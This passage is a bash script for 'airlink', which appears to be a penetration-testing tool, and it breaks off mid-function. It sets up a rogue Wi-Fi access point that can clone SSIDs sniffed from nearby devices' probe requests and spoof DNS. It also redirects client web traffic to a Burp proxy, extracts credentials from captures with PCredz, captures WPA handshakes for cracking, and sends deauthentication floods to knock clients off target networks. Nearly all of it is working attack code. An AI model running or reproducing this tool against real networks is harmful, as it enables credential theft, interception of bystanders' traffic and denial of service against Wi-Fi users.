#!/bin/bash
set -o pipefail

# Captures can contain credentials — keep everything this script writes private.
umask 077

# Variables
INTERFACE="wlan0"
SSID="airlink"
CHANNEL=6
WPA_PASSPHRASE=""
HIDDEN_SSID=0
SPOOF_MAC=""
MONITOR_IFACE_REQ=""   # -M argument (second adapter for live monitor ops)
MONITOR_IFACE=""       # actually placed into monitor mode
PROBE_SCAN=0           # -P: sniff probe requests at startup and clone an SSID
PROBE_SCAN_DURATION=15
DHCP_RANGE="10.0.0.3,10.0.0.200,12h"
INITIAL_STATIC_IP="10.0.0.1"
PREFIX_LEN=24
CRED_CAPTURE_DURATION=60
HANDSHAKE_DURATION=30
# Absolute, and anchored to the script rather than the caller's cwd: dnsmasq is
# launched by systemd with cwd "/", so a relative log-facility path makes it
# refuse to start outright.
SCRIPT_DIR=$(cd -- "$(dirname -- "${BASH_SOURCE[0]}")" && pwd)
CREDS_DIR="$SCRIPT_DIR/creds"
LOGS_DIR="$SCRIPT_DIR/logs"
SERVE_DIR="$SCRIPT_DIR/serve"
CA_DIR="$SCRIPT_DIR/ca"
INTERNET_INTERFACE=""
NETWORK_PREFIX="10.0.0"
SHARE_INTERNET=0
DEFAULT_BURP_PORT=8080
BURP_PORT=$DEFAULT_BURP_PORT
BURP_ENABLED=0
ALLOW_DEST=""
ALLOW_IP=""
DNS_SPOOF=0
ROLLING_PCAP=0
ROLLING_DURATION=300   # Seconds per rolling pcap chunk
ROLLING_COUNT=12       # Max rolling pcap files to keep (~1hr at 5min chunks)
ROLLING_TCPDUMP_PID=""
RUN_TMPDIR=""
DEVICE_FIFO=""
DHCP_HOOK=""
DEVICE_WATCHER_PID=""
CA_SERVER_PID=""
HOSTAPD_PID=""
HOSTAPD_CONF=""
CLEANED_UP=0
DNSMASQ_CONF="/etc/dnsmasq.d/custom-dhcp.conf"
ORIG_IP_FORWARD=""
ORIG_DNSMASQ_ACTIVE=""
# Interfaces we took away from NetworkManager / changed the type of, so cleanup
# can hand them back exactly as they were.
NM_RELEASED=()
MAC_SPOOFED_IFACE=""
WPA_SUPPLICANT_STOPPED=0

# ── Cyberpunk 2077 palette ──────────────────────────────────────────────────
# Signature neon yellow, cyan and hot magenta on black, red for alerts. Colour
# is emitted only to a real terminal (and honours NO_COLOR), so piped output and
# the dnsmasq/pcap logs never get polluted with escape codes.
if [[ -t 1 && -z "${NO_COLOR:-}" ]]; then
    C_YEL=$'\033[38;5;226m'   # CP2077 signature yellow
    C_CYN=$'\033[38;5;51m'    # neon cyan
    C_MAG=$'\033[38;5;198m'   # hot magenta / pink
    C_GRN=$'\033[38;5;48m'    # matrix green
    C_RED=$'\033[38;5;196m'   # alert red
    C_DIM=$'\033[38;5;244m'   # dim grey
    C_BLD=$'\033[1m'
    C_RST=$'\033[0m'
else
    C_YEL=""; C_CYN=""; C_MAG=""; C_GRN=""; C_RED=""; C_DIM=""; C_BLD=""; C_RST=""
fi

pl_msg() { echo "    ${C_YEL}${C_BLD}>>${C_RST} $*"; }
pl_err() { echo "    ${C_RED}${C_BLD}>> ERROR:${C_RST} ${C_RED}$*${C_RST}" >&2; }

# Remove only the firewall rules this script adds. Called once before setup to
# clear leftovers from a previous run, and again on exit. Kept separate from
# cleanup() so the pre-setup call cannot tear down state setup just built.
reset_firewall_rules() {
    if [[ -n "$INTERNET_INTERFACE" ]]; then
        iptables -t nat -D POSTROUTING -o "$INTERNET_INTERFACE" -j MASQUERADE 2>/dev/null
        if [[ -n "$ALLOW_IP" ]]; then
            iptables -D FORWARD -i "$INTERFACE" -o "$INTERNET_INTERFACE" -d "$ALLOW_IP" -j ACCEPT 2>/dev/null
            iptables -D FORWARD -i "$INTERFACE" -o "$INTERNET_INTERFACE" -j DROP 2>/dev/null
        else
            iptables -D FORWARD -i "$INTERFACE" -o "$INTERNET_INTERFACE" -j ACCEPT 2>/dev/null
        fi
        iptables -D FORWARD -i "$INTERNET_INTERFACE" -o "$INTERFACE" -m state --state RELATED,ESTABLISHED -j ACCEPT 2>/dev/null
    fi
    if [[ "$BURP_ENABLED" -eq 1 ]]; then
        iptables -t nat -D PREROUTING -i "$INTERFACE" -p tcp --dport 80 ! -d "$INITIAL_STATIC_IP" -j REDIRECT --to-port "$BURP_PORT" 2>/dev/null
        iptables -t nat -D PREROUTING -i "$INTERFACE" -p tcp --dport 443 -j REDIRECT --to-port "$BURP_PORT" 2>/dev/null
    fi
}

# Output is written by root but handed to whoever invoked sudo: mode 700 keeps
# captured credentials away from other local accounts, while the ownership means
# pcaps open in Wireshark without sudo.
own_as_invoker() {
    [[ -n "${SUDO_UID:-}" ]] || return 0
    chown -R "$SUDO_UID:${SUDO_GID:-$SUDO_UID}" "$@" 2>/dev/null
}

make_output_dir() {
    mkdir -p "$1" || return 1
    chmod 700 "$1"
    own_as_invoker "$1"
}

# Records the host's current value the first time it is called so cleanup can
# put it back exactly as it was.
enable_ip_forwarding() {
    [[ -z "$ORIG_IP_FORWARD" ]] && ORIG_IP_FORWARD=$(cat /proc/sys/net/ipv4/ip_forward 2>/dev/null)
    sysctl -w net.ipv4.ip_forward=1 >/dev/null
}

# Take a wireless interface away from NetworkManager and wpa_supplicant so
# hostapd (or monitor mode) can own it. NetworkManager will otherwise keep
# trying to (re)connect the card out from under us. Recorded so cleanup can
# return the interface to NM.
release_interface() {
    local iface="$1"
    rfkill unblock wifi 2>/dev/null
    rfkill unblock wlan 2>/dev/null
    if command -v nmcli &>/dev/null; then
        # Force any active association down first, then hand the device to us.
        nmcli dev disconnect "$iface" 2>/dev/null
        nmcli dev set "$iface" managed no 2>/dev/null && NM_RELEASED+=("$iface")
    fi
    # NetworkManager drives ONE shared, D-Bus-controlled wpa_supplicant whose
    # command line contains no interface name, so a per-iface pattern kill can't
    # find it. Marking the device unmanaged (above) is what makes NM release it
    # from that supplicant — but the release is asynchronous, so give the driver
    # a moment before we try to claim the radio. If it still won't let go, the
    # hostapd start below stops the supplicant outright and retries.
    pkill -f "wpa_supplicant.*$iface" 2>/dev/null
    sleep 1
}

restore_interface() {
    local iface="$1"
    # Back to managed type in case we left it in monitor/AP mode.
    ip link set "$iface" down 2>/dev/null
    iw dev "$iface" set type managed 2>/dev/null
    ip link set "$iface" up 2>/dev/null
}

# Setup-time only: clears any other DHCP server that would compete for the
# link. Deliberately broad — note it also stops a libvirt/LXD dnsmasq if one
# is running on this host.
clear_competing_dhcp() {
    # Remember whether the host's own dnsmasq unit was running before we touch
    # it, so cleanup can put it back exactly as it was (some hosts use dnsmasq
    # as their system resolver — stopping it for good would break their DNS).
    if [[ -z "$ORIG_DNSMASQ_ACTIVE" ]]; then
        systemctl is-active --quiet dnsmasq && ORIG_DNSMASQ_ACTIVE=1 || ORIG_DNSMASQ_ACTIVE=0
    fi
    systemctl stop dnsmasq 2>/dev/null
    pkill -f dhclient 2>/dev/null
    pkill -f dnsmasq 2>/dev/null
    pkill -f isc-dhcp-server 2>/dev/null
}

cleanup() {
    [[ $CLEANED_UP -eq 1 ]] && return
    CLEANED_UP=1
    echo ""
    pl_msg "cleaning up..."
    reset_firewall_rules
    # Restore the host's original setting rather than forcing 0 — other things
    # (Docker, libvirt, a VPN) may legitimately need forwarding enabled.
    if [[ -n "$ORIG_IP_FORWARD" ]]; then
        sysctl -w "net.ipv4.ip_forward=$ORIG_IP_FORWARD" >/dev/null
    fi
    # Rolling pcaps and the DNS log are written by root while running.
    own_as_invoker "$CREDS_DIR" "$LOGS_DIR"
    [[ -n "$ROLLING_TCPDUMP_PID" ]] && kill "$ROLLING_TCPDUMP_PID" 2>/dev/null
    [[ -n "$CA_SERVER_PID" ]]      && kill "$CA_SERVER_PID" 2>/dev/null
    [[ -n "$DEVICE_WATCHER_PID" ]] && kill "$DEVICE_WATCHER_PID" 2>/dev/null
    [[ -n "$HOSTAPD_PID" ]]        && kill "$HOSTAPD_PID" 2>/dev/null
    exec 3>&-  # Close FIFO write end so the watcher's reader gets EOF and exits
    # Undo the AP IP, hand the radio(s) back to NetworkManager, restore MAC.
    ip addr flush dev "$INTERFACE" 2>/dev/null
    restore_interface "$INTERFACE"
    [[ -n "$MONITOR_IFACE" ]] && restore_interface "$MONITOR_IFACE"
    if [[ -n "$MAC_SPOOFED_IFACE" ]] && command -v macchanger &>/dev/null; then
        ip link set "$MAC_SPOOFED_IFACE" down 2>/dev/null
        macchanger -p "$MAC_SPOOFED_IFACE" >/dev/null 2>&1
        ip link set "$MAC_SPOOFED_IFACE" up 2>/dev/null
    fi
    for iface in "${NM_RELEASED[@]}"; do
        nmcli dev set "$iface" managed yes 2>/dev/null
    done
    # If we stopped NetworkManager's shared supplicant to free the radio, bring
    # it back so NM can drive Wi-Fi again after we hand the interfaces over.
    if [[ $WPA_SUPPLICANT_STOPPED -eq 1 ]]; then
        systemctl start wpa_supplicant 2>/dev/null
        command -v nmcli &>/dev/null && nmcli dev connect "$INTERFACE" 2>/dev/null
    fi
    rm -f "$DNSMASQ_CONF"
    [[ -n "$RUN_TMPDIR" ]] && rm -rf "$RUN_TMPDIR"
    # Restore dnsmasq to the state it was in before we ran. Our config is now
    # removed, so if the host was running dnsmasq as its own resolver, a restart
    # brings it back with only the system config (host DNS restored); if it was
    # not running before, leave it stopped. No broad pkill — that would take
    # down an unrelated libvirt/LXD dnsmasq along with it.
    if [[ "$ORIG_DNSMASQ_ACTIVE" == "1" ]]; then
        systemctl restart dnsmasq 2>/dev/null
    else
        systemctl stop dnsmasq 2>/dev/null
    fi
    pl_msg "cleanup complete."
}

usage() {
    cat <<USAGE
Usage: $(basename "$0") [-i iface] [-e ssid] [-c channel] [-k passphrase] [-H]
                    [-m bssid] [-M mon_iface] [-P] [-p prefix]
                    [-s internet_iface] [-b [port]] [-o allow_dest] [-D] [-r]

  AP:
  -i <iface>   Wireless interface to run the AP on (default: $INTERFACE)
  -e <ssid>    SSID / network name to broadcast (default: $SSID)
  -c <chan>    Channel: 1-14 = 2.4GHz, 36+ = 5GHz (default: $CHANNEL)
  -k <pass>    WPA2 passphrase (8-63 chars). Omit for an OPEN network
  -H           Hidden SSID (do not broadcast the network name)
  -m <bssid>   Spoof the AP's BSSID/MAC ('random' or aa:bb:cc:dd:ee:ff)

  Recon (needs a second adapter unless noted):
  -M <iface>   Second adapter -> monitor mode for live sniff/deauth/handshake
  -P           Sniff probe requests at startup and offer to clone an SSID
               (works on the AP interface alone, before the AP comes up)

  Network / interception (identical to the wired tool):
  -p <X.Y.Z>   Network prefix for the DHCP subnet (default: $NETWORK_PREFIX)
  -s <iface>   Share internet from this interface via NAT
  -b [port]    Redirect client 80/443 to a Burp proxy (default port: $DEFAULT_BURP_PORT)
  -o <dest>    With -s, only allow client traffic to this IP/hostname
  -D           Spoof all DNS queries back to this machine
  -r           Record rolling background pcap (${ROLLING_DURATION}s chunks, last ${ROLLING_COUNT} kept)
  -h           Show this help

While running: Enter=scan  t=stations  c=capture creds  l=dns log
               p=probe sniff*  w=WPA handshake*  x=deauth*   (* need -M)  Ctrl+C=exit
USAGE
}

ORIGINAL_ARGS=("$@")

# bash getopts cannot express an optional option-argument, so a bare "-b" would
# otherwise swallow the following flag (or fail outright). Supply the default
# port only when "-b" is not already followed by one.
normalized_args=()
argc=$#
for ((n = 1; n <= argc; n++)); do
    arg="${!n}"
    if [[ "$arg" == "-b" ]]; then
        next_idx=$((n + 1))
        if [[ "${!next_idx:-}" =~ ^[0-9]+$ ]]; then
            normalized_args+=("-b" "${!next_idx}")
            ((n++))
        else
            normalized_args+=("-b" "$DEFAULT_BURP_PORT")
        fi
    else
        normalized_args+=("$arg")
    fi
done
set -- "${normalized_args[@]}"

while getopts "i:e:c:k:Hm:M:Pp:s:b:o:Drh?" opt; do
  case $opt in
    i) INTERFACE="$OPTARG";;
    e) SSID="$OPTARG";;
    c)
      CHANNEL="$OPTARG"
      if ! [[ "$CHANNEL" =~ ^[0-9]+$ ]]; then
        pl_err "channel must be a number (1-14 for 2.4GHz, 36+ for 5GHz)"
        exit 1
      fi
      ;;
    k)
      WPA_PASSPHRASE="$OPTARG"
      if [[ ${#WPA_PASSPHRASE} -lt 8 || ${#WPA_PASSPHRASE} -gt 63 ]]; then
        pl_err "WPA2 passphrase must be 8-63 characters"
        exit 1
      fi
      ;;
    H) HIDDEN_SSID=1;;
    m) SPOOF_MAC="$OPTARG";;
    M) MONITOR_IFACE_REQ="$OPTARG";;
    P) PROBE_SCAN=1;;
    p)
      NETWORK_PREFIX="$OPTARG"
      if ! [[ "$NETWORK_PREFIX" =~ ^[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}$ ]]; then
        pl_err "network prefix must be in the form X.Y.Z (e.g. 10.16.75)"
        exit 1
      fi
      ;;
    s)
      SHARE_INTERNET=1
      INTERNET_INTERFACE="$OPTARG"
      if ! ip link show "$INTERNET_INTERFACE" >/dev/null 2>&1; then
        pl_err "interface $INTERNET_INTERFACE does not exist"
        exit 1
      fi
      ;;
    b)
      BURP_ENABLED=1
      BURP_PORT="$OPTARG"
      if ! [[ "$BURP_PORT" =~ ^[0-9]+$ ]] || [[ "$BURP_PORT" -lt 1 ]] || [[ "$BURP_PORT" -gt 65535 ]]; then
        pl_err "burp port must be 1-65535 (got: $BURP_PORT)"
        exit 1
      fi
      ;;
    o) ALLOW_DEST="$OPTARG";;
    D) DNS_SPOOF=1;;
    r) ROLLING_PCAP=1;;
    h) usage; exit 0;;
    ?) usage; exit 1;;
  esac
done
shift $((OPTIND - 1))

if [[ $# -gt 0 ]]; then
    pl_err "unexpected argument: $1"
    usage
    exit 1
fi

if ! ip link show "$INTERFACE" >/dev/null 2>&1; then
    pl_err "interface $INTERFACE does not exist"
    pl_msg "available: $(ip -o link show | awk -F': ' '{print $2}' | tr '\n' ' ')"
    exit 1
fi

# Validate the AP interface is actually wireless — a wired NIC has no phy.
if ! iw dev "$INTERFACE" info >/dev/null 2>&1; then
    pl_err "$INTERFACE is not a wireless interface (use the wired tool for ethernet)"
    pl_msg "wireless interfaces: $(iw dev 2>/dev/null | awk '/Interface/{print $2}' | tr '\n' ' ')"
    exit 1
fi

if [[ -n "$MONITOR_IFACE_REQ" ]] && ! iw dev "$MONITOR_IFACE_REQ" info >/dev/null 2>&1; then
    pl_err "monitor interface $MONITOR_IFACE_REQ is not a wireless interface"
    exit 1
fi

if [[ -n "$MONITOR_IFACE_REQ" && "$MONITOR_IFACE_REQ" == "$INTERFACE" ]]; then
    pl_err "-M must be a different adapter from the AP interface (-i $INTERFACE)"
    pl_msg "this radio cannot run an AP and monitor mode at the same time"
    exit 1
fi

if [[ -n "$ALLOW_DEST" && $SHARE_INTERNET -eq 0 ]]; then
    pl_err "-o requires -s (an allowlist only applies to shared internet)"
    exit 1
fi

# Privileged work starts here — arguments and -h are handled above so they
# work without sudo.
if [[ $EUID -ne 0 ]]; then
    pl_err "this script must be run as root (try: sudo $0 ${ORIGINAL_ARGS[*]})"
    exit 1
fi

RUN_TMPDIR=$(mktemp -d /tmp/airlink.XXXXXX) || { pl_err "could not create temp dir"; exit 1; }
DEVICE_FIFO="$RUN_TMPDIR/notify.fifo"
DHCP_HOOK="$RUN_TMPDIR/dhcp-hook.sh"
HOSTAPD_CONF="$RUN_TMPDIR/hostapd.conf"

trap cleanup EXIT
trap 'exit 130' INT
trap 'exit 143' TERM

DHCP_RANGE="${NETWORK_PREFIX}.3,${NETWORK_PREFIX}.200,12h"
INITIAL_STATIC_IP="${NETWORK_PREFIX}.1"

# 2.4GHz (g) for channels 1-14, 5GHz (a) above that.
if [[ "$CHANNEL" -le 14 ]]; then HW_MODE="g"; else HW_MODE="a"; fi

echo ""
echo "    ${C_MAG}::${C_RST} ${C_YEL}${C_BLD}airlink${C_RST} ${C_MAG}::${C_RST} ${C_CYN}initiating wireless link...${C_RST}"
missing=""
command -v hostapd &>/dev/null || missing="$missing hostapd"
command -v dnsmasq &>/dev/null || missing="$missing dnsmasq"
command -v iw      &>/dev/null || missing="$missing iw"
command -v arp-scan &>/dev/null || missing="$missing arp-scan"
command -v tcpdump &>/dev/null || missing="$missing tcpdump"
if [[ -n "$missing" ]]; then
    pl_err "missing dependency:$missing"
    pl_msg "install: apt-get install -y hostapd dnsmasq iw arp-scan tcpdump"
    exit 1
fi
if [[ $BURP_ENABLED -eq 1 || $SHARE_INTERNET -eq 1 ]]; then
    command -v iptables &>/dev/null || { pl_err "missing: iptables (required for -s/-b)"; exit 1; }
fi
if [[ -n "$MONITOR_IFACE_REQ" ]]; then
    command -v airodump-ng &>/dev/null || pl_msg "note: airodump-ng not found — handshake capture (w) will be limited"
    command -v aireplay-ng &>/dev/null || pl_msg "note: aireplay-ng not found — deauth (x) unavailable"
fi
if [[ -n "$SPOOF_MAC" ]]; then
    command -v macchanger &>/dev/null || { pl_err "missing: macchanger (required for -m)"; exit 1; }
fi
if [[ -n "$ALLOW_DEST" ]]; then
    if [[ "$ALLOW_DEST" =~ ^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$ ]]; then
        ALLOW_IP="$ALLOW_DEST"
    else
        ALLOW_IP=$(getent ahostsv4 "$ALLOW_DEST" | awk 'NR==1 {print $1}')
        if [[ -z "$ALLOW_IP" ]]; then
            pl_err "could not resolve allowlist destination: $ALLOW_DEST"
            exit 1
        fi
    fi
    pl_msg "internet allowlist: $ALLOW_DEST ($ALLOW_IP)"
fi
pl_msg "dependencies OK"
echo ""

# ── Feature functions ─────────────────────────────────────────────────────────

# Put an interface into monitor mode (own it, down, set type, back up). Used for
# the second adapter (-M) and for the startup probe scan on the AP interface.
enter_monitor_mode() {
    local iface="$1"
    release_interface "$iface"
    ip link set "$iface" down 2>/dev/null || return 1
    # `set type monitor` is the portable form (needs the interface down first);
    # `set monitor` alone only tweaks flags on an already-monitor interface.
    iw dev "$iface" set type monitor 2>/dev/null || return 1
    ip link set "$iface" up 2>/dev/null || return 1
    return 0
}

# Sniff 802.11 probe requests on a monitor interface and print the SSIDs nearby
# devices are searching for. A non-empty SSID means a device is probing for a
# specific remembered network — a candidate to clone (evil twin). Discovered
# SSIDs are left in the global PROBE_CANDIDATES array for the caller to use.
PROBE_CANDIDATES=()
sniff_probes() {
    local iface="$1" duration="$2"
    local tmp
    PROBE_CANDIDATES=()
    tmp=$(mktemp)
    echo "Sniffing probe requests on $iface for ${duration}s (nearby devices announce networks they know)..."
    # -e prints the 802.11 header; tcpdump renders a probe request's SSID as
    # "Probe Request (<ssid>)". An empty () is a wildcard/broadcast probe.
    timeout "$duration" tcpdump -i "$iface" -e -s 256 -n \
        'type mgt subtype probe-req' 2>/dev/null > "$tmp" || true
    local ssid
    while read -r ssid; do
        [[ -z "$ssid" ]] && continue
        [[ " ${PROBE_CANDIDATES[*]} " == *" $ssid "* ]] && continue
        PROBE_CANDIDATES+=("$ssid")
    done < <(grep -oE 'Probe Request \(([^)]*)\)' "$tmp" 2>/dev/null \
             | sed -E 's/^Probe Request \((.*)\)$/\1/' | grep -v '^$' || true)
    rm -f "$tmp"
    if [[ ${#PROBE_CANDIDATES[@]} -eq 0 ]]; then
        echo "No named probe requests seen. Devices may only probe when their screen wakes; try again."
        return 1
    fi
    echo "${C_CYN}── SSIDs nearby devices are probing for ──${C_RST}"
    local i=1
    for ssid in "${PROBE_CANDIDATES[@]}"; do
        printf "  ${C_YEL}[%s]${C_RST} ${C_MAG}%s${C_RST}\n" "$i" "$ssid"
        ((i++))
    done
    echo "${C_CYN}──${C_RST}"
    return 0
}

# Optional startup flow: sniff probes on the AP interface (before the AP is up,
# so a single card is fine), then let the operator pick one to broadcast.
probe_scan_and_clone() {
    pl_msg "probe scan: putting $INTERFACE into monitor mode..."
    if ! enter_monitor_mode "$INTERFACE"; then
        pl_err "could not put $INTERFACE into monitor mode — skipping probe scan"
        restore_interface "$INTERFACE"
        return
    fi
    sniff_probes "$INTERFACE" "$PROBE_SCAN_DURATION"
    # Return the AP interface to managed so hostapd can take it in AP mode.
    restore_interface "$INTERFACE"
    [[ ${#PROBE_CANDIDATES[@]} -eq 0 ]] && return
    echo "Clone one of these as the AP SSID? Enter a number, or press Enter to keep '$SSID':"
    read -r choice
    if [[ "$choice" =~ ^[0-9]+$ ]] && [[ "$choice" -ge 1 ]] && [[ "$choice" -le ${#PROBE_CANDIDATES[@]} ]]; then
        SSID="${PROBE_CANDIDATES[$((choice - 1))]}"
        pl_msg "cloning SSID: $SSID"
    fi
}

capture_creds() {
    make_output_dir "$CREDS_DIR"
    local ts run_dir pcap
    ts=$(date +%Y%m%d-%H%M%S)
    run_dir="$CREDS_DIR/run_$ts"
    pcap="$CREDS_DIR/capture_$ts.pcap"
    echo "Capturing on $INTERFACE for ${CRED_CAPTURE_DURATION}s... (trigger client logins/auth if you can)"
    timeout "$CRED_CAPTURE_DURATION" tcpdump -i "$INTERFACE" -w "$pcap" 2>/dev/null
    echo "Capture done. Extracting credentials..."
    mkdir -p "$run_dir"
    cp "$pcap" "$run_dir/capture.pcap"
    local extracted=0
    if command -v pcredz &>/dev/null; then
        (cd "$run_dir" && pcredz -f capture.pcap -o . 2>/dev/null) || (cd "$run_dir" && pcredz -f capture.pcap 2>/dev/null)
        extracted=1
    elif command -v Pcredz &>/dev/null; then
        (cd "$run_dir" && Pcredz -f capture.pcap -o . 2>/dev/null) || (cd "$run_dir" && Pcredz -f capture.pcap 2>/dev/null)
        extracted=1
    elif command -v netcredz &>/dev/null; then
        (cd "$run_dir" && netcredz -f capture.pcap 2>/dev/null)
        extracted=1
    else
        for pc in /usr/share/pcredz/Pcredz /opt/pcredz/Pcredz; do
            if [[ -f "$pc" ]]; then
                (cd "$run_dir" && python3 "$pc" -f capture.pcap -o . 2>/dev/null) || (cd "$run_dir" && python3 "$pc" -f capture.pcap 2>/dev/null)
                extracted=1
                break
            fi
        done
    fi
    local found=0
    local logfile="$CREDS_DIR/creds.log"
    # *.log covers PCredz's CredentialDump*.log; *.txt covers NTLMv1/NTLMv2/MSKerb.
    # Listing those names explicitly as well would append each match twice.
    for f in "$run_dir"/*.log "$run_dir"/*.txt; do
        [[ -s "$f" ]] || continue
        found=1
        {
            echo ""
            echo "=== $ts | $(basename "$f") ==="
            echo "*** CREDENTIALS FOUND ***"
            cat "$f"
        } >> "$logfile"
    done
    own_as_invoker "$CREDS_DIR"
    if [[ $found -eq 1 ]]; then
        echo "${C_RED}${C_BLD}*** CREDENTIALS FOUND! ***${C_RST} ${C_YEL}stored in $logfile${C_RST}"
    elif [[ $extracted -eq 1 ]]; then
        echo "No credentials in this capture. Pcap saved at $pcap"
    else
        echo "No credential extractor found (install PCredz or NetCredz). Pcap saved at $pcap"
        echo "  Run manually: pcredz -f $pcap -o <outdir>"
    fi
}

scan_network() {
    arp-scan -I "$INTERFACE" --localnet 2>/dev/null | grep -F "$NETWORK_PREFIX" || true
}

# Clients currently associated to our AP, straight from the driver.
list_stations() {
    echo "${C_CYN}── associated stations on $INTERFACE ──${C_RST}"
    local macs
    macs=$(iw dev "$INTERFACE" station dump 2>/dev/null | awk '/Station/{print $2}')
    if [[ -z "$macs" ]]; then
        echo "  ${C_DIM}(none associated yet)${C_RST}"
    else
        while read -r mac; do
            [[ -z "$mac" ]] && continue
            # Match the station's MAC to a DHCP lease to show its IP/hostname.
            local lease
            lease=$(grep -i " $mac " /var/lib/misc/dnsmasq.leases 2>/dev/null | awk '{print $3" "$4}')
            printf "  ${C_MAG}%s${C_RST}  ${C_YEL}%s${C_RST}\n" "$mac" "${lease:-(no lease yet)}"
        done <<< "$macs"
    fi
    echo "${C_CYN}──${C_RST}"
}

show_dns_log() {
    if [[ -f "$LOGS_DIR/dns.log" ]]; then
        echo "${C_CYN}── last 30 DNS queries ──${C_RST}"
        tail -n 30 "$LOGS_DIR/dns.log"
        echo "${C_CYN}──${C_RST}"
    else
        pl_msg "No DNS log yet (queries appear after the first client connects)."
    fi
}

# Live probe sniff during a session — needs the second adapter, since the AP
# radio is busy being an AP.
live_probe_sniff() {
    if [[ -z "$MONITOR_IFACE" ]]; then
        pl_msg "probe sniff needs a second adapter in monitor mode (-M <iface>)."
        return
    fi
    sniff_probes "$MONITOR_IFACE" "$PROBE_SCAN_DURATION"
}

# Capture a WPA handshake for a target AP on the monitor adapter. Optionally
# fires deauths to force a client to reassociate so the 4-way handshake is seen.
capture_handshake() {
    if [[ -z "$MONITOR_IFACE" ]]; then
        pl_msg "handshake capture needs a second adapter in monitor mode (-M <iface>)."
        return
    fi
    if ! command -v airodump-ng &>/dev/null; then
        pl_msg "airodump-ng not installed (apt-get install aircrack-ng)."
        return
    fi
    local bssid chan
    echo "Target AP BSSID (aa:bb:cc:dd:ee:ff):"; read -r bssid
    if ! [[ "$bssid" =~ ^([0-9a-fA-F]{2}:){5}[0-9a-fA-F]{2}$ ]]; then
        pl_err "invalid BSSID"; return
    fi
    echo "Target channel:"; read -r chan
    if ! [[ "$chan" =~ ^[0-9]+$ ]]; then pl_err "invalid channel"; return; fi
    make_output_dir "$CREDS_DIR"
    local ts prefix
    ts=$(date +%Y%m%d-%H%M%S)
    prefix="$CREDS_DIR/handshake_$ts"
    iw dev "$MONITOR_IFACE" set channel "$chan" 2>/dev/null
    echo "Capturing handshake on $MONITOR_IFACE (ch $chan, bssid $bssid) for ${HANDSHAKE_DURATION}s..."
    timeout "$HANDSHAKE_DURATION" airodump-ng --bssid "$bssid" -c "$chan" \
        -w "$prefix" --output-format pcap "$MONITOR_IFACE" >/dev/null 2>&1 &
    local dump_pid=$!
    # A couple of broadcast deauths to nudge associated clients into re-handshaking.
    if command -v aireplay-ng &>/dev/null; then
        sleep 3
        echo "  firing deauths to prompt a reassociation..."
        aireplay-ng --deauth 5 -a "$bssid" "$MONITOR_IFACE" >/dev/null 2>&1 || true
    fi
    wait "$dump_pid" 2>/dev/null
    own_as_invoker "$CREDS_DIR"
    # airodump-ng appends "-01.cap" etc; grab the first match via a glob rather
    # than parsing ls. The prefix is our own timestamped path, so at most a
    # handful match.
    local caps=( "${prefix}"*.cap )
    local cap="${caps[0]}"
    [[ -e "$cap" ]] || cap=""
    if [[ -n "$cap" ]]; then
        if command -v aircrack-ng &>/dev/null && aircrack-ng "$cap" 2>/dev/null | grep -q "1 handshake"; then
            echo "${C_GRN}${C_BLD}*** WPA handshake captured ***${C_RST} ${C_YEL}-> $cap${C_RST}"
            echo "  crack: aircrack-ng -w <wordlist> $cap"
        else
            echo "Capture saved -> $cap (no handshake confirmed; try again with a client present)."
        fi
    else
        echo "No capture file produced."
    fi
}

# Targeted deauth on the monitor adapter — knock a client (or everyone) off a
# target AP so they reassociate (to the real AP, or to our clone).
run_deauth() {
    if [[ -z "$MONITOR_IFACE" ]]; then
        pl_msg "deauth needs a second adapter in monitor mode (-M <iface>)."
        return
    fi
    if ! command -v aireplay-ng &>/dev/null; then
        pl_msg "aireplay-ng not installed (apt-get install aircrack-ng)."
        return
    fi
    local bssid chan client count
    echo "Target AP BSSID (aa:bb:cc:dd:ee:ff):"; read -r bssid
    if ! [[ "$bssid" =~ ^([0-9a-fA-F]{2}:){5}[0-9a-fA-F]{2}$ ]]; then
        pl_err "invalid BSSID"; return
    fi
    echo "Target channel:"; read -r chan
    if ! [[ "$chan" =~ ^[0-9]+$ ]]; then pl_err "invalid channel"; return; fi
    echo "Client MAC to deauth (blank = broadcast/all clients):"; read -r client
    if [[ -n "$client" ]] && ! [[ "$client" =~ ^([0-9a-fA-F]{2}:){5}[0-9a-fA-F]{2}$ ]]; then
        pl_err "invalid client MAC"; return
    fi
    echo "Number of deauth bursts (default 10, 0 = continuous until Ctrl+C on the burst):"; read -r count
    [[ "$count" =~ ^[0-9]+$ ]] || count=10
    iw dev "$MONITOR_IFACE" set channel "$chan" 2>/dev/null
    if [[ -n "$client" ]]; then
        pl_msg "deauthing $client from $bssid (ch $chan) x$count"
        aireplay-ng --deauth "$count" -a "$bssid" -c "$client" "$MONITOR_IFACE" 2>&1 | tail -5 || true
    else
        pl_msg "deauthing ALL clients of $bssid (ch $chan) x$count"
        aireplay-ng --deauth "$count" -a "$bssid" "$MONITOR_IFACE" 2>&1 | tail -5 || true
    fi
}

# Rolling background capture: -G seconds per file, -W max files, strftime filename
start_rolling_pcap() {
    make_output_dir "$CREDS_DIR"
    pl_msg "rolling pcap: ${ROLLING_DURATION}s chunks, max ${ROLLING_COUNT} files -> $CREDS_DIR/"
    tcpdump -i "$INTERFACE" \
        -G "$ROLLING_DURATION" \
        -W "$ROLLING_COUNT" \
        -w "$CREDS_DIR/rolling_%Y%m%d-%H%M%S.pcap" 2>/dev/null &
    ROLLING_TCPDUMP_PID=$!
}

# Device watcher: dnsmasq calls DHCP_HOOK on every lease event.
# Handles both 'add' (new device) and 'old' (reconnect) so second connections
# are announced — dnsmasq only fires 'add' on a brand-new lease, 'old' on renewal.
# A named FIFO carries hook output to a background reader without polling or
# file-watching. FD 3 is kept open on the write end so hook writes never block
# and the reader never gets a premature EOF between connections.
start_device_watcher() {
    mkfifo "$DEVICE_FIFO"

    cat > "$DHCP_HOOK" << HOOKEOF
#!/bin/bash
ACTION="\$1"; MAC="\$2"; IP="\$3"; HOST="\${4:-}"
[[ "\$ACTION" == "add" || "\$ACTION" == "old" ]] && printf "%s %s %s %s\n" "\$ACTION" "\$MAC" "\$IP" "\$HOST" > "$DEVICE_FIFO"
HOOKEOF
    chmod +x "$DHCP_HOOK"

    # Read-write (3<>) rather than write-only (3>) is essential: opening a FIFO
    # write-only blocks until a reader attaches, and the reader below is started
    # after this line — write-only deadlocks here and the script never proceeds.
    # Holding this end open also stops hook writes from blocking and stops the
    # reader from seeing EOF between lease events.
    exec 3<>"$DEVICE_FIFO"

    (
        while read -r action mac ip host; do
            # New joins glow cyan, returning clients magenta — quick visual triage.
            label="NEW"; lc="$C_CYN"
